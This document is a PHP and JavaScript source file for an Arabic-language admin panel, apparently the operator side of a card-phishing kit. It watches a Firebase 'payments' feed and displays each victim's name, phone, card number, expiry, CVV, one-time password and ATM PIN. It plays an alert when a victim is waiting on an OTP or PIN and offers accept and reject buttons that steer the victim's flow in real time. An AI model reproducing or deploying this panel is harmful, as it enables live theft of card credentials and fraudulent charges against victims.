<?php
// إعدادات الدخول (يمكنك تغييرها من هنا)
$username_required = "Hassan"; 
$password_required = "Ha123456@@";

session_start();
if (isset($_POST['login'])) {
    if ($_POST['user'] == $username_required && $_POST['pass'] == $password_required) {
        $_SESSION['loggedin'] = true;
    } else {
        $error = "بيانات الدخول غير صحيحة!";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: Admin_panel.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; background-color: #f1f5f9; margin: 0; padding: 0; }
        
        /* شاشة تسجيل الدخول */
        .login-overlay { position: fixed; top:0; left:0; width:100%; height:100%; background:#1e293b; display: flex; align-items: center; justify-content: center; z-index: 9999; }
        .login-box { background:#fff; padding: 30px; border-radius: 12px; width: 320px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .login-box input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #e2e8f0; border-radius: 6px; box-sizing: border-box; font-family: 'Cairo'; }
        .login-box button { width: 100%; padding: 12px; background: #00acc1; color:#fff; border:none; border-radius:6px; cursor:pointer; font-weight:800; font-family:'Cairo'; }
        
        /* الهيدر والمحتوى */
        .admin-content { padding: 15px; }
        .header { background: #1e293b; color: #fff; padding: 15px; border-radius: 0 0 15px 15px; margin-bottom: 20px; text-align: center; position: relative; }
        .online-tag { background: #22c55e; display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; font-weight: 800; margin-top: 10px; }
        .logout-btn { position: absolute; left: 15px; top: 15px; color: #ef4444; text-decoration: none; font-size: 12px; font-weight: bold; }

        /* كروت العملاء */
        .client-card { background: #fff; border-radius: 8px; padding: 12px 20px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #e2e8f0; transition: 0.3s; }
        .has-new { background-color: #dcfce7 !important; border-color: #22c55e !important; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.4); } 70% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); } 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0); } }

        .info-group { display: flex; gap: 30px; flex: 1; }
        .info-item { display: flex; flex-direction: column; }
        .info-item b { font-size: 10px; color: #94a3b8; }
        .info-item span { font-size: 14px; font-weight: 700; color: #1e293b; }

        .details-panel { display: none; background: #fff; border: 1px solid #e2e8f0; border-top: none; margin-top: -8px; margin-bottom: 10px; padding: 15px; border-radius: 0 0 8px 8px; }
        .flex-container { display: flex; align-items: start; justify-content: space-between; gap: 15px; }
        .data-column-strip { display: flex; flex-direction: column; gap: 10px; background: #f8fafc; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #edf2f7; text-align: right; }
        .unit-row { display: flex; flex-direction: column; gap: 3px; border-bottom: 1px solid #edf2f7; padding-bottom: 8px; }
        .unit-row:last-child { border-bottom: none; padding-bottom: 0; }
        .unit { font-size: 14px; font-weight: 700; color: #0f172a; }
        .unit label { display: block; font-size: 10px; color: #94a3b8; font-weight: 700; }

        .control-btns { display: flex; flex-direction: column; gap: 10px; margin-top: 10px; }
        .btn-ctrl { padding: 8px 25px; border: none; border-radius: 6px; font-family: 'Cairo'; font-weight: 800; font-size: 13px; cursor: pointer; transition: 0.3s; background: #e2e8f0; color: #94a3b8; }
        .active-green { background: #22c55e !important; color: #fff !important; }
        .active-red { background: #ef4444 !important; color: #fff !important; }
        .btn-open { background: #00acc1; color: #fff; padding: 8px 15px; border: none; border-radius: 6px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

<?php if (!isset($_SESSION['loggedin'])): ?>
    <div class="login-overlay">
        <div class="login-box">
            <h2>دخول النظام</h2>
            <?php if(isset($error)) echo "<p style='color:red; font-size:12px;'>$error</p>"; ?>
            <form method="POST">
                <input type="text" name="user" placeholder="اسم المستخدم" required>
                <input type="password" name="pass" placeholder="كلمة المرور" required>
                <button type="submit" name="login">دخول</button>
            </form>
        </div>
    </div>
<?php else: ?>

    <div class="header">
        <a href="?logout=1" class="logout-btn">خروج</a>
        <h1>لوحة التحكم</h1>
        <div class="online-tag">الزيارات الحالية: <span id="online-count">0</span></div>
    </div>

    <div class="admin-content" id="display-area">
        <div class="client-card has-new" id="card-demo">
            <div class="info-group">
                <div class="info-item"><b>الاسم</b><span>عميل تجريبي</span></div>
                <div class="info-item"><b>الجوال</b><span>050XXXXXXX</span></div>
                <div class="info-item"><b>الحجز</b><span>--:-- --</span></div>
            </div>
            <button class="btn-open" onclick="toggleData('demo')">البيانات ⬇</button>
        </div>
        <div class="details-panel" id="panel-demo">
            <div class="flex-container">
                <div class="data-column-strip">
                    <div class="unit-row"><div class="unit"><label>اسم صاحب البطاقة</label>---- ---- ----</div></div>
                    <div class="unit-row"><div class="unit"><label>رقم البطاقة</label>**** **** **** ****</div></div>
                    <div class="unit-row" style="flex-direction:row; gap:15px;"><div class="unit" style="flex:1"><label>تاريخ الانتهاء</label>--/--</div><div class="unit" style="flex:1"><label>CVV</label>***</div></div>
                    <div class="unit-row" style="flex-direction:row; gap:15px; border-bottom:none;"><div class="unit" style="flex:1"><label>OTP الرمز</label><span style="color:#f59e0b">******</span></div><div class="unit" style="flex:1"><label>ATM PIN</label><span style="color:#8b5cf6">****</span></div></div>
                </div>
                <div class="control-btns">
                    <button class="btn-ctrl active-green" onclick="this.className='btn-ctrl'">قبول</button>
                    <button class="btn-ctrl active-red" onclick="this.className='btn-ctrl'">رفض</button>
                </div>
            </div>
        </div>
    </div>

    <audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>

    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <script>
    const firebaseConfig = { databaseURL: "YOUR_FIREBASE_URL" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // عداد الزيارات
    db.ref('payments').on('value', (snapshot) => {
        document.getElementById('online-count').innerText = snapshot.numChildren();
    });

    // مراقبة البيانات
    db.ref('payments').on('value', (snapshot) => {
        const area = document.getElementById('display-area');
        area.innerHTML = area.children[0].outerHTML + area.children[1].outerHTML; 

        snapshot.forEach((child) => {
            const val = child.val();
            const id = child.key;
            const isNewAction = (val.status === 'pending_otp' || val.status === 'pending_pin');
            if(isNewAction) document.getElementById('notif').play();

            const row = `
                <div class="client-card ${isNewAction ? 'has-new' : ''}" id="card-${id}">
                    <div class="info-group">
                        <div class="info-item"><b>الاسم</b><span>${val.full_name || '---'}</span></div>
                        <div class="info-item"><b>الجوال</b><span>${id}</span></div>
                        <div class="info-item"><b>الحجز</b><span>${val.booking_time || '---'}</span></div>
                    </div>
                    <button class="btn-open" onclick="toggleData('${id}')">البيانات ⬇</button>
                </div>
                <div class="details-panel" id="panel-${id}">
                    <div class="flex-container">
                        <div class="data-column-strip">
                            <div class="unit-row"><div class="unit"><label>اسم صاحب البطاقة</label>${val.card_holder_name || '---'}</div></div>
                            <div class="unit-row"><div class="unit"><label>رقم البطاقة</label>${val.card_number || '---'}</div></div>
                            <div class="unit-row" style="flex-direction:row; gap:15px;">
                                <div class="unit" style="flex:1"><label>تاريخ الانتهاء</label>${val.exp_date || '---'}</div>
                                <div class="unit" style="flex:1"><label>CVV</label>${val.cvv || '---'}</div>
                            </div>
                            <div class="unit-row" style="flex-direction:row; gap:15px; border-bottom:none;">
                                <div class="unit" style="flex:1"><label>OTP الرمز</label><span style="color:#f59e0b">${val.otp || '---'}</span></div>
                                <div class="unit" style="flex:1"><label>ATM PIN</label><span style="color:#8b5cf6">${val.pin || '---'}</span></div>
                            </div>
                        </div>
                        <div class="control-btns">
                            <button id="acc-${id}" class="btn-ctrl ${isNewAction ? 'active-green' : ''}" onclick="sendCmd('${id}', 'success')">قبول</button>
                            <button id="rej-${id}" class="btn-ctrl ${isNewAction ? 'active-red' : ''}" onclick="sendCmd('${id}', 'error')">رفض</button>
                        </div>
                    </div>
                </div>`;
            area.innerHTML += row;
        });
    });

    function toggleData(id) {
        const p = document.getElementById('panel-' + id);
        const c = document.getElementById('card-' + id);
        if(p.style.display === 'block') { p.style.display = 'none'; } 
        else { p.style.display = 'block'; c.classList.remove('has-new'); }
    }

    function sendCmd(id, status) {
        db.ref('payments/' + id).update({ status: status });
        document.getElementById('acc-' + id).className = 'btn-ctrl';
        document.getElementById('rej-' + id).className = 'btn-ctrl';
    }
    </script>
<?php endif; ?>
</body>
</html>